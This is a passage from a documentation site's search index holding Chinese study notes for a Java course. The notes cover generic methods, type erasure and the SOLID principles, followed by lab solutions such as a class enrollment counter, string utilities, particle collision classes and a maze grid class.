Methods","text":"<p>\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u72ec\u7acb\u4e8e\u7c7b\u5b9a\u4e49\u81ea\u5df1\u7684\u7c7b\u578b\u53c2\u6570</p> <p>\u7c7b\u578b\u53c2\u6570\u5217\u8868\u653e\u5728\u4fee\u9970\u7b26\uff08\u5982 <code>public static</code>\uff09\u4e4b\u540e\uff0c\u8fd4\u56de\u7c7b\u578b\u4e4b\u524d\u3002</p> <pre><code>public class GenericMax {\n    // \u5b9a\u4e49\u4e86\u4e00\u4e2a\u7c7b\u578b\u53c2\u6570 T\uff0c\u5b83\u5fc5\u987b\u5b9e\u73b0 Comparable&lt;T&gt;\n    public static &lt;T extends Comparable&lt;T&gt;&gt; T max(T a, T b) {\n        if (a.compareTo(b) &gt; 0) {\n            return a;\n        } else {\n            return b;\n        }\n    }\n}\n</code></pre> <p><code>T</code> \u7684\u5177\u4f53\u542b\u4e49\u662f\u8ddf\u5bf9\u8c61\u7ed1\u5b9a\u7684\uff0c\u800c\u9759\u6001\u65b9\u6cd5\u5c5e\u4e8e\u7c7b\uff0c\u4e0d\u5c5e\u4e8e\u4efb\u4f55\u7279\u5b9a\u7684\u5bf9\u8c61\u3002\u56e0\u4e3a\u9759\u6001\u65b9\u6cd5\u4e0d\u4e0e\u4efb\u4f55\u7279\u5b9a\u5bf9\u8c61\u5173\u8054\uff0c\u6240\u4ee5\u5b83\u65e0\u6cd5\u77e5\u9053\u5f53\u524d\u4e0a\u4e0b\u6587\u4e2d <code>T</code> \u5e94\u8be5\u4ee3\u8868\u54ea\u4e2a\u5177\u4f53\u7c7b\u578b\u3002\u56e0\u6b64\u5f53\u4f60\u9700\u8981\u5728\u9759\u6001\u65b9\u6cd5\u4e2d\u4f7f\u7528\u6cdb\u578b\u65f6\uff0c\u4f60\u4e0d\u80fd\u4f7f\u7528\u7c7b\u5b9a\u4e49\u7684\u7c7b\u578b\u53c2\u6570\uff08\u5982 <code>T</code>\uff09\u3002\u76f8\u53cd\uff0c\u4f60\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u6cdb\u578b\u9759\u6001\u65b9\u6cd5\uff0c\u5b83\u6709\u81ea\u5df1\u72ec\u7acb\u7684\u7c7b\u578b\u53c2\u6570\u3002</p>"},{"location":"cs/java/basics/w9/#type-erasure","title":"Type Erasure","text":"<p>Java \u4e2d\u7684\u6cdb\u578b\u4e3b\u8981\u662f\u7f16\u8bd1\u65f6\u7684\u7279\u6027\u3002\u5728\u7f16\u8bd1\u4ee3\u7801\u65f6\uff0c\u7f16\u8bd1\u5668\u4f1a\u68c0\u67e5\u6cdb\u578b\u7684\u7c7b\u578b\u5b89\u5168\u6027\uff0c\u7f16\u8bd1\u5b8c\u6210\u540e\uff0c\u6240\u6709\u7684\u6cdb\u578b\u7c7b\u578b\u4fe1\u606f\u90fd\u4f1a\u88ab\u64e6\u9664 (erased) \u3002\u7c7b\u578b\u53c2\u6570\uff08\u5982 <code>T</code>\uff09\u5728\u5b57\u8282\u7801\u4e2d\u4f1a\u88ab\u66ff\u6362\u6210\u5b83\u4eec\u7684\u8fb9\u754c\u3002\u7f16\u8bd1\u5668\u4f1a\u5728\u9700\u8981\u7684\u5730\u65b9\u81ea\u52a8\u63d2\u5165\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\uff0c\u4ee5\u4fdd\u8bc1\u8fd0\u884c\u65f6\u903b\u8f91\u7684\u6b63\u786e\u6027 \u3002\u7c7b\u578b\u64e6\u9664\u662f Java \u6cdb\u578b\u5b9e\u73b0\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u4f46\u5b83\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u9650\u5236\u548c\u201c\u9677\u9631\u201d (sharp edges)\u3002</p> <ul> <li>\u4e0d\u80fd\u521b\u5efa\u7c7b\u578b\u53c2\u6570\u7684\u5b9e\u4f8b \u5982 <code>new T()</code></li> </ul> <ul> <li>\u4e0d\u80fd\u521b\u5efa\u6cdb\u578b\u6570\u7ec4 (\u5982 <code>new T[100]</code>)</li> </ul> <ul> <li>\u4e0d\u80fd\u5bf9\u5e26\u6709\u53c2\u6570\u5316\u7c7b\u578b\u7684\u5bf9\u8c61\u4f7f\u7528 <code>instanceof</code> \u68c0\u67e5 (\u5982 <code>obj instanceof ArrayList&lt;String&gt;</code>)</li> </ul> <ul> <li>\u64e6\u9664\u540e\u65b9\u6cd5\u7b7e\u540d\u76f8\u540c\u4f1a\u9020\u6210\u6b67\u4e49</li> </ul> <p>Method Signature\uff1a\u5728 Java \u4e2d\uff0c\u4e00\u4e2a\u65b9\u6cd5\u7684\u7b7e\u540d\u4e3b\u8981\u7531\u5b83\u7684\u65b9\u6cd5\u540d\u548c\u53c2\u6570\u7c7b\u578b\u5217\u8868\u7ec4\u6210\u3002</p> <pre><code>public class MyGenericClass&lt;T, V&gt; {\n\n    public void process(T data) {\n        System.out.println(\"Processing T: \" + data);\n    }\n\n    public void process(V data) { // \u770b\u8d77\u6765\u548c\u4e0a\u9762\u90a3\u4e2a\u4e0d\u540c\n        System.out.println(\"Processing V: \" + data);\n    }\n}\n</code></pre> <p>\u64e6\u9664\u540e\u90fd\u53d8\u6210\u4e86 <code>process(Objec data)</code> \u7f16\u8bd1\u9636\u6bb5\u5c31\u4f1a\u62a5\u9519</p>"},{"location":"cs/java/basics/w9/#solid","title":"SOLID","text":"<p>\u201cClean Code\u201d by Robert Martin</p> <p>Robert Martin \u7ed9 OOP \u4ee3\u7801\u89c4\u8303\u63d0\u51fa\u4e86\u539f\u5219\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86\u8ba9\u4ee3\u7801\u5bb9\u6613\u7406\u89e3\u3001\u7075\u6d3b\u3001\u53ef\u91cd\u7528\u3001\u6613\u4e8e\u7ef4\u62a4\uff0c\u8ba9\u4f60\u611f\u89c9\u50cf\u662f\u4e2a\u201c\u771f\u6b63\u7684\u201d\u5de5\u7a0b\u5e08</p>"},{"location":"cs/java/basics/w9/#single-responsibility-principle-srp","title":"Single Responsibility Principle - SRP","text":"<ul> <li>\u4e00\u4e2a\u7c7b\u5e94\u8be5\u53ea\u6709\u4e00\u4e2a\u5f15\u8d77\u5b83\u53d8\u5316\u7684\u539f\u56e0 \u3002\u8fd9\u610f\u5473\u7740\u4e00\u4e2a\u7c7b\u5e94\u8be5\u53ea\u627f\u62c5\u4e00\u9879\u804c\u8d23\uff0c\u6216\u8005\u8bf4\u53ea\u505a\u4e00\u4ef6\u4e8b\u60c5 \u3002 \u8fd9\u4f7f\u5f97\u4ee3\u7801\u66f4\u5bb9\u6613\u6d4b\u8bd5\u548c\u7ef4\u62a4 \u3002\u5982\u679c\u4e00\u4e2a\u7c7b\u53ea\u505a\u4e00\u4ef6\u4e8b\uff0c\u90a3\u4e48\u601d\u8003\u5982\u4f55\u4f7f\u7528\u548c\u6d4b\u8bd5\u5b83\u4f1a\u66f4\u5bb9\u6613 \u3002</li> </ul> <p>\u4f8b\u5982\uff0c\u5c06\u6587\u4ef6\u8bfb\u53d6\u3001\u5199\u5165\u548c\u538b\u7f29\u7684\u529f\u80fd\u5206\u6563\u5230<code>FileReader</code>\u3001<code>FileWriter</code>\u548c<code>FileCompressor</code>\u4e09\u4e2a\u4e0d\u540c\u7684\u7c7b\u4e2d\uff0c\u800c\u4e0d\u662f\u653e\u5728\u4e00\u4e2a<code>FileManager</code>\u7c7b\u91cc\uff0c\u5c31\u662f\u9075\u5faaSRP\u7684\u4f8b\u5b50 \u3002\u540c\u6837\uff0c\u5c06\u8ff7\u5bab\u6570\u636e\u7684\u7ba1\u7406\uff08<code>Grid</code>\u7c7b\uff09\u548c\u8def\u5f84\u67e5\u627e\uff08<code>MazeSolver</code>\u7c7b\uff09\u5206\u5f00\u4e5f\u662fSRP\u7684\u5e94\u7528 \u3002</p>"},{"location":"cs/java/basics/w9/#open-closed-principle-ocp","title":"Open-Closed Principle - OCP","text":"<p>\u8f6f\u4ef6\u5b9e\u4f53\uff08\u5982\u7c7b\u3001\u6a21\u5757\u3001\u51fd\u6570\u7b49\uff09\u5e94\u8be5\u5bf9\u6269\u5c55\u5f00\u653e\uff0c\u5bf9\u4fee\u6539\u5173\u95ed \u3002\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5e94\u8be5\u80fd\u591f\u901a\u8fc7\u6dfb\u52a0\u65b0\u4ee3\u7801\uff08\u5982\u65b0\u7c7b\u6216\u65b0\u65b9\u6cd5\uff09\u6765\u589e\u52a0\u65b0\u529f\u80fd\uff0c\u800c\u4e0d\u662f\u4fee\u6539\u73b0\u6709\u4ee3\u7801 \u3002</p> <ul> <li>\u56e0\u6b64\u9f13\u52b1\u4f7f\u7528\u63a5\u53e3\u548c\u62bd\u8c61\u7c7b\uff0c\u964d\u4f4e\u5728\u6dfb\u52a0\u65b0\u529f\u80fd\u65f6\u5f15\u5165\u9519\u8bef\u7684\u98ce\u9669 \u3002</li> </ul> <p>\u901a\u8fc7\u8ba1\u7b97\u56fe\u5f62\u9762\u79ef\u7684\u4f8b\u5b50\u8bf4\u660e\uff0c\u4f7f\u7528 <code>Shape</code> \u63a5\u53e3\uff0c\u5e76\u8ba9 <code>Circle</code> \u548c <code>Square</code> \u7c7b\u5b9e\u73b0\u8be5\u63a5\u53e3\u6765\u8ba1\u7b97\u5404\u81ea\u7684\u9762\u79ef\uff0c\u6bd4\u5728\u4e00\u4e2a <code>AreaCalculator</code> \u7c7b\u4e2d\u4f7f\u7528 <code>if-else</code> \u5224\u65ad\u5f62\u72b6\u7c7b\u578b\u6765\u8ba1\u7b97\u9762\u79ef\u8981\u597d \u3002\u6dfb\u52a0\u65b0\u5f62\u72b6\uff08\u5982\u4e09\u89d2\u5f62\uff09\u65f6\uff0c\u53ea\u9700\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u5b9e\u73b0 <code>Shape</code> \u63a5\u53e3\u7684\u7c7b\uff0c\u800c\u65e0\u9700\u4fee\u6539\u73b0\u6709\u4ee3\u7801 \u3002   </p> <pre><code>public enum ShapeType {\n    CIRCLE, SQUARE\n}\n\npublic class Shape {\n    public ShapeType type;\n    public double radius; // for Circle\n    public double side; // for Square\n}\n\npublic class AreaCalculator {\n    public double area(Shape shape) {\n        if (shape.type == ShapeType.CIRCLE) {\n            return Math.PI * shape.radius * shape.radius;\n        } else if (shape.type == ShapeType.SQUARE) {\n            return shape.side * shape.side;\n        }\n        return 0;\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u6837\u7684\u7a0b\u5e8f\u4e00\u65e6\u51fa\u73b0\u65b0\u7684 Shape \u5c31\u4e0d\u5f97\u4e0d\u4fee\u6539 <code>AreaCalculator</code> \u7c7b</p> <pre><code>public interface Shape {\n    double area();\n}\n\nclass Circle implements Shape {\n    private double radius;\n\n    public double area() {\n        return Math.PI * radius * radius;\n    }\n}\n\nclass Square implements Shape {\n    private double side;\n\n    public double area() {\n        return side * side;\n    }\n}\n</code></pre> <p>\u6211\u4eec\u5e94\u8be5\u505a\u7684\u662f\u5229\u7528\u63a5\u53e3\u5236\u5b9a\u51c6\u5219\uff0c\u8fd9\u4e00\u5757\u662f <code>open</code> \u7684\uff0c\u4f46 <code>implements</code> \u662f <code>close</code> \u7684</p>"},{"location":"cs/java/basics/w9/#liskov-substitution-principle-lsp","title":"Liskov Substitution Principle - LSP","text":"<p>\u91cc\u6c0f\u66ff\u6362\u539f\u5219\uff1a\u4e00\u4e2a\u5b50\u7c7b\u5e94\u8be5\u80fd\u88c5\u4f5c\u81ea\u5df1\u662f\u5b83\u7684\u7236\u7c7b\uff0c\u800c\u4e0d\u4f1a\u5f04\u574f\u4ec0\u4e48\u4e1c\u897f\u3002</p> <ul> <li>\u8fd9\u9f13\u52b1\u4e86\u6b63\u786e\u7684\u7ee7\u627f\u548c\u591a\u6001\u6027\u3002</li> </ul> <ul> <li>\u786e\u4fdd\u65b0\u7684\u6d3e\u751f\u7c7b\u4e0d\u4f1a\u5e26\u6765\u610f\u5916\u7684\u884c\u4e3a\u3002</li> </ul> <pre><code>class Bird {\n    void fly() {\n    }\n}\n\nclass Penguin extends Bird {\n    @Override\n    void fly() {\n        throw new UnsupportedOperationException(\"Penguins can't fly\");\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u8fd9\u6837\u7684\u7a0b\u5e8f\u8fdd\u53cd\u4e86 <code>LSP</code>\u56e0\u4e3a\u76f4\u63a5\u4fee\u6539\u4e86 <code>fly</code> \u7684\u65b9\u6cd5\uff0c\u8fd9\u6837\u5982\u679c\u8ba9\u4f01\u9e45\u66ff\u4ee3\u9e1f\u7c7b\u4f7f\u7528\u5c31\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u4f01\u9e45\u4e0d\u4f1a\u98de</p> <pre><code>abstract class Bird {\n    abstract void move();\n}\n\nclass FlyingBird extends Bird {\n    @Override\n    void move() {\n        fly();\n    }\n\n    void fly() { ... }\n}\n\nclass NonFlyingBird extends Bird {\n    @Override\n    void move() {\n        walk();\n    }\n\n    void walk() { ... }\n}\n</code></pre> <p>\u56e0\u6b64\u6211\u4eec\u4f7f\u7528\u66f4\u62bd\u8c61\u601d\u60f3\u6d3e\u751f\u51fa\u4f1a\u98de\u4e0e\u4e0d\u4f1a\u98de\u4e24\u4e2a\u62bd\u8c61\u7c7b\u578b</p> <p>\u4ee5\u53ca\u7528 <code>function</code> \u4e92\u76f8\u8c03\u7528\u7684\u65b9\u5f0f\u6700\u5c0f\u5316\u5f71\u54cd</p> <p>\u4f60\u89c9\u5f97\u7535\u52a8\u4eba\u9020\u9e2d\u770b\u8d77\u6765\u50cf\u9e2d\u5b50\u62bd\u8c61\u4e3a\u9e2d\uff0c\u4f46\u662f\u524d\u8005\u9700\u8981\u7535\u6c60\uff0c\u90a3\u5c31\u662f\u9519\u8bef\u62bd\u8c61</p>"},{"location":"cs/java/basics/w9/#interface-segregation-principle-isp","title":"Interface Segregation Principle - ISP","text":"<p>\u63a5\u53e3\u9694\u79bb\u539f\u5219</p> <ul> <li>\u5ba2\u6237\u7aef\u4e0d\u5e94\u8be5\u88ab\u5f3a\u8feb\u4f9d\u8d56\u5b83\u4eec\u4e0d\u4f7f\u7528\u7684\u65b9\u6cd5 \u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f7f\u7528\u591a\u4e2a\u4e13\u95e8\u7684\u5c0f\u63a5\u53e3\u901a\u5e38\u6bd4\u4f7f\u7528\u4e00\u4e2a\u5e9e\u5927\u81c3\u80bf\u7684\u63a5\u53e3\u8981\u597d\uff0c\u8fd9\u6837\u53ef\u4ee5\u63d0\u9ad8\u4ee3\u7801\u7684\u53ef\u7ef4\u62a4\u6027\u548c\u53ef\u8bfb\u6027 </li> </ul> <pre><code>public class GameEntity {\n    public Model3D getModel() { ... }\n\n    public Point3D getPosition() { ... }\n\n    public int getHP() { ... }\n\n    public int getAttack() { ... }\n}\n\nclass Renderer {\n    public void render(GameEntity entity) {\n        // We don't care about getHP() and getAttack()\n    }\n}\n</code></pre> <p>\u6bd4\u5982\u4e0a\u8ff0\u4ee3\u7801\u4e2d\uff0c\u6e38\u620f\u5f00\u53d1\u5546\u7ee7\u627f\u6e38\u620f\u5b9e\u4f53\u540e\u9700\u8981\u5f00\u53d1\u4e00\u4e2a\u6e32\u67d3\u7c7b\uff0c\u8fd9\u4e2a\u6e32\u67d3\u7c7b\u4e0d\u9700\u8981\u8840\u91cf\u548c\u653b\u51fb\u529b\u53c2\u6570\uff0c\u5c31\u9020\u6210\u4e86\u5185\u5b58\u6d6a\u8d39\uff0c\u6240\u4ee5\u4ece\u8bbe\u8ba1\u4e4b\u521d\u5c31\u8981\u8003\u8651\u5230\u4f7f\u7528\u7684\u5c0f\u62bd\u8c61\u63a5\u53e3\uff1a</p> <pre><code>interface Renderable {\n    Model3D getModel();\n\n    Point3D getPosition();\n}\n\ninterface Fighter {\n    int getHP();\n\n    int getAttack();\n}\n\npublic class GameEntity implements Renderable, Fighter {\n    public Model3D getModel() { ... }\n\n    public Point3D getPosition() { ... }\n\n    public int getHP() { ... }\n\n    public int getAttack() { ... }\n}\n\nclass Renderer {\n    public void render(Renderable entity) {\n        // Much better\n    }\n}\n</code></pre> <p>\u7528\u63a5\u53e3\u5b9e\u73b0\u53ef\u6e32\u67d3\u3001\u6709\u6218\u58eb\u8fd9\u4e24\u4e2a\u51c6\u5219</p> <p>\u8fd9\u6837 <code>Renderer</code> \u7c7b\u5c31\u53ef\u4ee5\u53ea\u4f9d\u8d56\u4e8e <code>Renderable</code> \u63a5\u53e3</p>"},{"location":"cs/java/basics/w9/#dependency-inversion-principle-dip","title":"Dependency Inversion Principle - DIP","text":"<p>\u4f9d\u8d56\u5012\u7f6e\u539f\u5219</p> <ul> <li>\u9ad8\u5c42\u6a21\u5757\u4e0d\u5e94\u8be5\u4f9d\u8d56\u4e8e\u4f4e\u5c42\u6a21\u5757\uff0c\u4e24\u8005\u90fd\u5e94\u8be5\u4f9d\u8d56\u4e8e\u62bd\u8c61 \u3002\u62bd\u8c61\u4e0d\u5e94\u8be5\u4f9d\u8d56\u4e8e\u7ec6\u8282\uff0c\u7ec6\u8282\u5e94\u8be5\u4f9d\u8d56\u4e8e\u62bd\u8c61 \u3002\u7b80\u5355\u6765\u8bf4\uff0c\u8981\u9762\u5411\u63a5\u53e3\u7f16\u7a0b\uff0c\u800c\u4e0d\u662f\u9762\u5411\u5b9e\u73b0\u7f16\u7a0b \u3002</li> </ul> <p>\u8fd9\u6837\u4f7f\u4ee3\u7801\u66f4\u52a0\u7075\u6d3b\u3002\u5982\u679c\u6539\u53d8\u4e86\u4e00\u4e2a\u5177\u4f53\u7c7b\u7684\u5b9e\u73b0\uff0c\u4e0d\u9700\u8981\u68c0\u67e5\u6240\u6709\u4f9d\u8d56\u5b83\u7684\u7c7b \u3002</p> <pre><code>class EmailService {\n    void sendEmail(String message, String recipient) { ... }\n}\n\nclass Notification {\n    EmailService emailService;\n\n    void sendNotification(String message, String recipient) {\n        emailService.sendEmail(message, recipient);\n    }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230 <code>Notification</code> \u76f4\u63a5\u4f9d\u8d56\u4e8e <code>EmailService</code> \u800c\u4e0d\u662f\u63a5\u53e3\uff0c\u6b63\u786e\u5b9e\u73b0\u5e94\u8be5\u662f</p> <pre><code>interface MessageService {\n    void sendMessage(String message, String recipient);\n}\n\nclass EmailService implements MessageService {\n    @Override\n    public void sendMessage(String message, String recipient) {\n        // Not real code\n    }\n}\n\npublic class Notification {\n    MessageService messageService;\n\n    void sendNotification(String message, String recipient) {\n        // Now we can change the message service whenever we want\n        // Depending on an interface is better than depending on a class\n        messageService.sendMessage(message, recipient);\n    }\n}\n</code></pre> <p>\u5c06\u6765\u5982\u679c\u9700\u8981\u77ed\u4fe1\u901a\u77e5\u670d\u52a1\u518d\u5b9e\u73b0\u4e00\u4e2a <code>MessageService</code> \u5c31\u884c\uff0c\u5176\u4ed6\u7c7b\u4e0d\u9700\u8981\u88ab\u66f4\u6539</p>"},{"location":"cs/java/basics/w9/#labs","title":"Labs","text":"<ul> <li> <ol> <li><code>ArrayList</code> \u6570\u636e\u5e93\u8ddf\u8e2a\u6bcf\u95e8\u8bfe\u7a0b\u4e2d\u7684\u5b66\u751f\u6570\u91cf</li> </ol> </li> </ul> <pre><code>import java.util.ArrayList;\n\nclass StudentCourse {\n    String studentName;\n    String courseName;\n\n    public StudentCourse(String student, String course) {\n        this.studentName = student;\n        this.courseName = course;\n    }\n\n    public String getStudentName() {\n        return studentName;\n    }\n\n    public String getCourseName() {\n        return courseName;\n    }\n}\n\npublic class ClassDatabase {\n\n    private ArrayList&lt;StudentCourse&gt; enrollments;\n\n    public ClassDatabase() {\n        this.enrollments = new ArrayList&lt;&gt;();\n    }\n\n    public void addCourseStudent(String student, String course) {\n        StudentCourse newEntry = new StudentCourse(student, course);\n        this.enrollments.add(newEntry);\n    }\n\n    public int countStudents(String course) {\n        int count = 0;\n        for (StudentCourse entry : this.enrollments) {\n            if (entry.getCourseName().equals(course)) {\n                count++;\n            }\n        }\n        return count;\n    }\n\n    public static void main(String[] args) {\n        ClassDatabase db = new ClassDatabase();\n        db.addCourseStudent(\"Alan Turing\", \"CITS2005\");\n        db.addCourseStudent(\"Alan Turing\", \"CITS2200\");\n        db.addCourseStudent(\"Max\", \"CITS9999\");\n        db.addCourseStudent(\"Gozz\", \"CITS9999\");\n        db.addCourseStudent(\"Jane Doe\", \"CITS2005\");\n\n        System.out.println(db.countStudents(\"CITS2005\"));\n        System.out.println(db.countStudents(\"CITS2200\"));\n        System.out.println(db.countStudents(\"CITS9999\"));\n        System.out.println(db.countStudents(\"CITS1001\"));\n    }\n}\n</code></pre> <ul> <li> <ol> <li><code>StringAPI</code></li> </ol> </li> </ul> <pre><code>public class WordTools {\n\n    public static boolean isWord(String input) {\n        if (input == null || input.isEmpty()) {\n            return false;\n        }\n        for (char c : input.toCharArray()) {\n            if (!Character.isLetter(c)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static boolean isLowerCaseWord(String input) {\n        if (input == null || input.isEmpty()) {\n            return false;\n        }\n        for (char c : input.toCharArray()) {\n            if (!Character.isLowerCase(c)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static boolean isUpperCaseWord(String input) {\n        if (input == null || input.isEmpty()) {\n            return false;\n        }\n        for (char c : input.toCharArray()) {\n            if (!Character.isUpperCase(c)) {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static boolean isSarcasmCaseWord(String input) {\n        if (!isWord(input)) {\n            return false;\n        }\n        if (input.length() &lt;= 1) {\n            return true;\n        }\n        for (int i = 1; i &lt; input.length(); i++) {\n            char previousChar = input.charAt(i - 1);\n            char currentChar = input.charAt(i);\n            boolean isPreviousUpper = Character.isUpperCase(previousChar);\n            boolean isCurrentUpper = Character.isUpperCase(currentChar);\n            if (isPreviousUpper == isCurrentUpper) {\n                return false;\n            }\n        }\n        return true;\n    }\n</code></pre> <ul> <li> <ol> <li>Overload <code>MyString</code> \u65b9\u6cd5</li> </ol> </li> </ul> <pre><code>public class MyString {\n    private char[] chars;\n\n    public MyString(char[] chars) {\n        this.chars = new char[chars.length];\n        for (int i = 0; i &lt; chars.length; i++) {\n            this.chars[i] = chars[i];\n        }\n    }\n\n    public char charAt(int index) {\n        return chars[index];\n    }\n\n    public int length() {\n        return chars.length;\n    }\n\n    public boolean equals(MyString s) {\n        if (length() != s.length())\n            return false;\n        for (int i = 0; i &lt; length(); i++) {\n            if (charAt(i) != s.charAt(i))\n                return false;\n        }\n        return true;\n    }\n\n    public MyString substring(int start, int end) {\n        char[] newChars = new char[end - start];\n        for (int i = start; i &lt; end; i++) {\n            newChars[i - start] = chars[i];\n        }\n        return new MyString(newChars);\n    }\n\n    public MyString concatenate(MyString s) {\n        char[] newChars = new char[chars.length + s.length()];\n        for (int i = 0; i &lt; chars.length; i++)\n            newChars[i] = chars[i];\n        for (int i = 0; i &lt; s.length(); i++)\n            newChars[chars.length + i] = s.charAt(i);\n        return new MyString(newChars);\n    }\n}\n</code></pre> <ul> <li><code>\u201cboolean equals\uff08String s\uff09\u201d</code>\uff0c\u9002\u7528\u4e8e\u666e\u901a\u7684 Java \u5b57\u7b26\u4e32</li> <li><code>\u201cMyString substring\uff08int start\uff09\u201d</code>\uff0c\u8fd4\u56de\u4ece \u201cstart\u201d \u5230\u5b57\u7b26\u4e32\u672b\u5c3e\u7684\u5b50\u5b57\u7b26\u4e32\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528\u73b0\u6709\u7684 substring \u65b9\u6cd5\u6765\u7f16\u5199\u66f4\u77ed\u7684\u4ee3\u7801\u5417\uff1f</li> <li><code>\u201cMyString concatenate\uff08char c\uff09\u201d\uff0c</code>\u8fde\u63a5\u5355\u4e2a\u5b57\u7b26</li> </ul> <pre><code>public boolean equals(String s) {\n    if (s == null) { \n        return false;\n    }\n    if (this.length() != s.length()) { \n        return false;\n    }\n    for (int i = 0; i &lt; this.length(); i++) {\n        if (this.charAt(i) != s.charAt(i)) {\n            return false;\n        }\n    }\n    return true;\n}\n\npublic MyString substring(int start) {\n    if (start &lt; 0 || start &gt; this.length()) {\n       throw new StringIndexOutOfBoundsException(\"Invalid starting index: \" + start + \" (The string length is: \" + this.length() + \")\");\n    }\n    // \u8c03\u7528\u73b0\u6709\u7684 substring \u65b9\u6cd5\uff0c\u7ed3\u675f\u7d22\u5f15\u662f\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\n    return this.substring(start, this.length());\n}\n\npublic MyString concatenate(char c) {\n    char[] charAsArray = { c };\n    MyString charAsMyString = new MyString(charAsArray);\n    return this.concatenate(charAsMyString);\n}\n</code></pre> <ul> <li> <ol> <li><code>ParticleCollider</code></li> </ol> </li> </ul> <pre><code>import java.util.Arrays;\n\nabstract class Particle {\n    public abstract Particle collide(Particle other);\n\n    @Override\n    public String toString() {\n        return this.getClass().getSimpleName();\n    }\n}\n\nabstract class Xapper extends Particle {\n}\n\nabstract class Zipper extends Particle {\n}\n\nclass ParticleA extends Xapper {\n    @Override\n    public Particle collide(Particle other) {\n        if (other instanceof Xapper) {\n            return new ParticleA();\n        } else {\n            return new ParticleB();\n        }\n    }\n}\n\nclass ParticleB extends Xapper {\n    @Override\n    public Particle collide(Particle other) {\n        if (other instanceof Zipper) {\n            return new ParticleC();\n        } else {\n            return new ParticleA();\n        }\n    }\n}\n\nclass ParticleC extends Zipper {\n    @Override\n    public Particle collide(Particle other) {\n        if (other instanceof ParticleA) {\n            return new ParticleC();\n        } else {\n            return new ParticleD();\n        }\n    }\n}\n\nclass ParticleD extends Zipper {\n    @Override\n    public Particle collide(Particle other) {\n        if (other instanceof Zipper) {\n            return new ParticleC();\n        } else {\n            return new ParticleA();\n        }\n    }\n}\n</code></pre> <ul> <li> <ol> <li><code>Maze</code></li> </ol> </li> </ul> <pre><code>YourProjectFolder/\n\u251c\u2500\u2500 MazeSolver.java\n\u2514\u2500\u2500 maze/\n    \u251c\u2500\u2500 Maze.java\n    \u251c\u2500\u2500 MazeBoundsException.java\n    \u2514\u2500\u2500 RandomMaze.java\n</code></pre> <p>\u8d70\u8ff7\u5bab, <code>#</code> \u4ee3\u8868\u5899, <code>x</code> \u4ee3\u8868\u8d70\u8fc7\u8def\u5f84</p> <pre><code> ######\n  #   #\n# # # #\n# # # #\n# # # #\n#   # #\n#####  \n</code></pre> <pre><code>x######\nxx#xxx#\n#x#x#x#\n#x#x#x#\n#x#x#x#\n#xxx#x#\n#####xx\n</code></pre> <p><code>maze/Maze.java</code> </p> <pre><code>package maze;\n\n/**\n * \u8868\u793a\u4e00\u4e2a 2D \u7f51\u683c\u8ff7\u5bab\u3002\n */\npublic class Maze {\n    /** \u7f51\u683c\u5b58\u50a8 (true = \u5899, false = \u7a7a) */\n    private boolean[][] grid;\n    /** \u884c\u6570 */\n    private int numRows;\n    /** \u5217\u6570 */\n    private int numCols;\n\n    /**\n     * \u6784\u9020\u51fd\u6570\u3002\n     * @param rows \u884c\u6570 (&gt;0)\u3002\n     * @param cols \u5217\u6570 (&gt;0)\u3002\n     * @throws IllegalArgumentException \u5982\u679c\u7ef4\u5ea6\u65e0\u6548\u3002\n     */\n    public Maze(int rows, int cols) {\n        if (rows &lt;= 0 || cols &lt;= 0) {\n            throw new IllegalArgumentException(\"\u8ff7\u5bab\u7ef4\u5ea6\u5fc5\u987b\u4e3a\u6b63\u6570\u3002 Rows: \" + rows + \", Cols: \" + cols);\n        }\n        this.numRows = rows;\n        this.numCols = cols;\n        this.grid = new boolean[rows][cols]; // \u9ed8\u8ba4 false (\u7a7a)\n    }\n\n    /**\n     * \u5728 (row, col) \u5904\u8bbe\u7f6e\u5899\u3002\n     * @param row \u884c\u7d22\u5f15\u3002\n     * @param col \u5217\u7d22\u5f15\u3002\n     * @throws MazeBoundsException \u5982\u679c\u5750\u6807\u8d85\u51fa\u8fb9\u754c\u3002\n     */\n    public void setWall(int row, int col) throws MazeBoundsException {\n        checkBounds(row, col);\n        this.grid[row][col] = true; // true \u4ee3\u8868\u5899\n    }\n\n    /**\n     * \u68c0\u67e5 (row, col) \u5904\u662f\u5426\u6709\u5899\u3002\n     * @param row \u884c\u7d22\u5f15\u3002\n     * @param col \u5217\u7d22\u5f15\u3002\n     * @return \u5982\u679c\u662f\u5899\u5219\u8fd4\u56de true\u3002\n     * @throws MazeBoundsException \u5982\u679c\u5750\u6807\u8d85\u51fa\u8fb9\u754c\u3002\n     */\n    public boolean isWall(int row, int col) throws MazeBoundsException {\n        checkBounds(row, col);\n        return this.grid[row][col];\n    }\n\n    /**\n     * \u83b7\u53d6\u884c\u6570\u3002\n     * @return \u884c\u6570\u3002\n     */\n    public int getNumRows() {\n        return this.numRows;\n    }\n\n    /**\n     * \u83b7\u53d6\u5217\u6570\u3002\n     * @return \u5217\u6570\u3002\n     */\n    public int getNumCols() {\n        return this.numCols;\n    }\n\n    /**\n     * \u68c0\u67e5\u5750\u6807\u662f\u5426\u5728\u8fb9\u754c\u5185\u3002\n     * @param row \u884c\u7d22\u5f15\u3002\n     * @param col \u5217\u7d22\u5f15\u3002\n     * @throws MazeBoundsException \u5982\u679c\u5750\u6807\u65e0\u6548\u3002\n     */\n    private void checkBounds(int row, int col) throws MazeBoundsException {\n        if (row &lt; 0 || row &gt;= this.numRows || col &lt; 0 || col &gt;= this.numCols) {\n            throw new MazeBoundsException(\"\u5750\u6807 (\" + row + \", \" + col + \") \u8d85\u51fa\u8ff7\u5bab\u8fb9\u754c (\u5927\u5c0f: \"\n                                        + this.numRows + \"x\" + this.numCols + \")\");\n        }\n    }\n}\n</code></pre> 